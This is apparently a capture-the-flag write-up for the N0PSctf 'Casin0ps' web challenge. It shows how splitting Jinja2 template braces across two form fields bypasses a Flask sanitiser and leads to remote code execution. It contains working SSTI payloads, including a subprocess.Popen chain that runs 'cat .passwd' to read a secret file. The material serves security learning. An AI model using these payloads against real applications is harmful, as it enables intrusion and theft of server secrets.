---
title: "Casin0ps - N0PSctf"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["web", "python3", "ssti", "flask", "subprocess", "n0psctf", "ctf-writeup"]
summary: "The website is composed by 4 parts:"
source:
  name: "CTFtime writeup #40262"
  url: "https://ctftime.org/writeup/40262"
ctf:
  name: "N0PSctf"
  challenge: "Casin0ps"
---

## Metadata

- **CTF:** N0PSctf
- **Task:** Casin0ps
- **Author team:** Sqli Enjoyer
- **CTFtime tags:** web, python3, ssti
- **CTFtime:** <https://ctftime.org/writeup/40262>

---
# Overall

The website is composed by 4 parts:  
\- Register  
\- Login  
\- Casino  
\- Export CSV

## Dinamic CSV

Here is an example of a exported csv. I register in the page as username: mio, email: [[email protected]](https://ctftime.org/cdn-cgi/l/email-protection) and a password  
```  
USERNAME,mio  
MAIL,[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)  
INSCRIPTION DATE,2025-06-02 01:16:34  
MONEY,1000.0  
```

There are 2 dinamic Values. Lets test how it manage special characters as <> ' " $ { }...

### Payload: username: mio1<'"${} email: <script>alert(1);</script>

Response in the /export path:  
```  
USERNAME,SANITIZED  
MAIL,SANITIZED  
INSCRIPTION DATE,2025-06-02 01:16:34  
MONEY,1000.0  
```

Well, it didn't break anything, but weird enough, it does not try to remove the special characters, just replaces it with a word.

## More payloads

After testing a bunch of payloads. Found one really odd response

### Payload: username: mio2{ email: {{2*2}}

Response in the /export path:  
```  
USERNAME,mio2{  
MAIL,SANITIZED  
INSCRIPTION DATE,2025-06-02 01:16:34  
MONEY,1000.0  
```

Oh username is not sanitizided???.

tinkering a bit found out, sanitizarion only trrigers if the chars { AND } are in one field. Weird that only works works if both of them are in it, other chars like < or > will trigger if one of them appears. Wait what technologies is using the web page?

## Wappalyzer  
Using this browser extension it gave us Flask and python as part of the stack. So SSTI is a posibility.

## Bypassing the filter???  
After sending random shit. I could not bypass the filter it always responeded with SANITIZED. Well not all of them...

### 2 dinamic inputs.

You see, i did not succed having "{" and "}" in one parameter. But we have 2 :). So ,hypothetically, what would happen if i send a payload like this:

### Payload: username: mio3{{ email: }}

Response in the /export path:  
```  
USERNAME,mio3(Undefined,)  
INSCRIPTION DATE,2025-06-02 01:49:24  
MONEY,1000.0  
STATS,"{\"played\": 0, \"avg_gain\": 0}"  
```

oh, OH MY GOD, It f*cking worked

We could have rce, if we can access the popen library from python.

### Payload: username:mio4{{ email: ''.__class__.__base__.__subclasses__()}}

Response: 

No, there is like more of 600 classes  
But we can see subprocess.Popen'> being in the list.  
Ladys and Gentelman we got it.

## Final Step  
After this it was just crafting a payload to read the flag.

### Payload: username: mio78{{ email: ''.__class__.__base__.__subclasses__()[528]('cat .passwd', shell=True, stdout=-1).communicate()}}

Response:  
```  
USERNAME,mio78(Undefined, (b'N0PS{s5T1_4veRywh3R3!!}', None))  
INSCRIPTION DATE,2025-06-02 02:01:05  
MONEY,1000.0  
STATS,"{\"played\": 0, \"avg_gain\": 0}"  
```  
Flag:   
```  
N0PS{s5T1_4veRywh3R3!!}  
```
